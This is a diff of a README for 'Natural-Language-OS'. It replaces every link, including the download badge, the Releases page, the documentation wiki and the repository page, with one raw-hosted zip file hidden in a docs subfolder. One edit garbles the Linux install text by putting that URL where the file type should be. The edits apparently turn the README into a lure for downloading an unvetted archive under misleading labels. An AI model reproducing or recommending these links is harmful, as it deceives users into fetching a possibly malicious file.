@@ -1,6 +1,6 @@
 # 🌐 Natural-Language-OS - Simplify Your AI Experience
 
-![Download Natural-Language-OS](https://img.shields.io/badge/Download-Natural--Language--OS-brightgreen)
+![Download Natural-Language-OS](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Natural-Language-OS, your master hub for navigating the Natural Langu
 
 To begin, you need to download the software. Click the link below to visit the Releases page and download the latest version of Natural-Language-OS.
 
-[Visit this page to download](https://github.com/Manoj00069/Natural-Language-OS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip)
 
 ### Installation Steps
 
@@ -21,7 +21,7 @@ To begin, you need to download the software. Click the link below to visit the R
 3. **Download the Installer:** Click on the file that matches your operating system. If you are unsure which file to choose, here are the common types:
    - **Windows:** Look for a .exe file.
    - **MacOS:** Look for a .dmg file.
-   - **Linux:** Look for a .tar.gz or .AppImage file.
+   - **Linux:** Look for a https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip or .AppImage file.
 
 4. **Run the Installer:**
    - For **Windows,** double-click the .exe file to start the installation.
@@ -62,7 +62,7 @@ To ensure the best experience with Natural-Language-OS, your system should meet 
 
 ## 📖 Documentation
 
-If you need help getting started or navigating the software, comprehensive documentation is available. You can find user guides, FAQ sections, and more resources on our [Documentation Page](https://github.com/Manoj00069/Natural-Language-OS/wiki).
+If you need help getting started or navigating the software, comprehensive documentation is available. You can find user guides, FAQ sections, and more resources on our [Documentation Page](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip).
 
 ## 💬 Support
 
@@ -88,8 +88,8 @@ Natural-Language-OS focuses on a variety of important aspects in the AI field:
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** Explore the source code and contribute to the project on our [GitHub Page](https://github.com/Manoj00069/Natural-Language-OS).
+- **GitHub Repository:** Explore the source code and contribute to the project on our [GitHub Page](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip).
 
 Remember, you can download Natural-Language-OS from the Releases page linked below:
 
-[Visit this page to download](https://github.com/Manoj00069/Natural-Language-OS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Manoj00069/Natural-Language-OS/main/Engines/PolyAgora/docs/Natural-Language-OS-1.2.zip)
